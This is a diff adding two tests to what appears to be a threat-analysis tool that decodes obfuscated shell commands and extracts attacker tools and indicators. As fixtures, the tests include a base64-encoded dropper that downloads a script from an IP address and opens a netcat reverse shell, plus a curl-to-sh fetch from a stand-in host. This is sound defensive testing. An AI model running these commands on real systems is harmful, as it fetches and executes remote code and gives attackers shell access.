@@ -361,3 +361,48 @@ def test_training_features_match_the_classifier():
         assert scale == FeatureExtractor.FEATURE_SCALES[name], (
             f"{name} is normalised differently during training and inference"
         )
+
+
+def test_obfuscated_payload_reaches_tool_detection():
+    """A base64 dropper must be decoded before analysis, not just flagged.
+
+    Section V.B.2 records the expert interviews requiring recursive decoding
+    before TTP mapping. Previously `base64` was only a pattern to match on, so
+    the command below was recorded as one opaque string and the C2 host inside
+    it was never extracted as an indicator.
+    """
+    import base64
+
+    from app.ai.nlp_engine import nlp_engine
+
+    inner = "wget http://45.9.148.99/x.sh -O /tmp/x; chmod 777 /tmp/x; nc -e /bin/bash 45.9.148.99 4444"
+    encoded = base64.b64encode(inner.encode()).decode()
+
+    result = nlp_engine.analyze_commands([f"echo {encoded} | base64 -d | sh"])
+
+    assert result["is_obfuscated"] is True
+    assert result["deobfuscation"]["layer_count"] >= 1
+    # The payload's own behaviour, recovered from inside the encoding.
+    assert {"wget_curl", "netcat", "reverse_shell"} <= set(result["tool_names"])
+    # And the C2 address, which is the durable indicator.
+    assert "45.9.148.99" in result["extracted_ips"]
+
+
+def test_deobfuscation_recurses_and_terminates():
+    """Nested encodings unwrap; plain text produces no layers and no loop."""
+    import base64
+
+    from app.ai.deobfuscate import MAX_DEPTH, deobfuscate_commands
+
+    inner = "curl http://evil.tld/stage2.sh | sh"
+    once = base64.b64encode(inner.encode()).decode()
+    twice = base64.b64encode(once.encode()).decode()
+
+    nested = deobfuscate_commands([f"echo {twice} | base64 -d | base64 -d | sh"])
+    assert nested.max_depth == 2
+    assert any(inner in layer.decoded for layer in nested.layers)
+    assert nested.max_depth <= MAX_DEPTH
+
+    # No false positives on ordinary commands.
+    plain = deobfuscate_commands(["ls -la", "whoami", "cat /etc/passwd"])
+    assert plain.layers == []
